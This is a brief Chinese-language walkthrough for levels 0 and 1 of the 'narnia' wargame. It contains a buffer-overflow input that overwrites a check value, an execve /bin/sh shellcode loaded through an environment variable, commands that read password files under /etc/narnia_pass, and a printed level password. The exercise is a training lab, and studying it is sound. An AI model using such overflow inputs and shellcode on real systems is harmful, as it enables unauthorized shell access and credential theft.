# wargame---narnia

开始信息

## narnia0
使用scanf来读数据，exploit：  
```bash
(python -c "print 'A'*20 + '\xef\xbe\xad\xde'";cat) | ./narnia0
```
此时身份为narnia1,可以读取narnia1的密码文件`cat /etc/narnia_pass/narnia1`:  
efeidiedae  

## narnia1
设置环境变量，执行narnia1，读取用户narnia2的密码即可：  
```bash
export EGG=$(python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
/narnia/narnia1
cat /etc/narnia_pass/narnia2

```


---
2018/1/19  
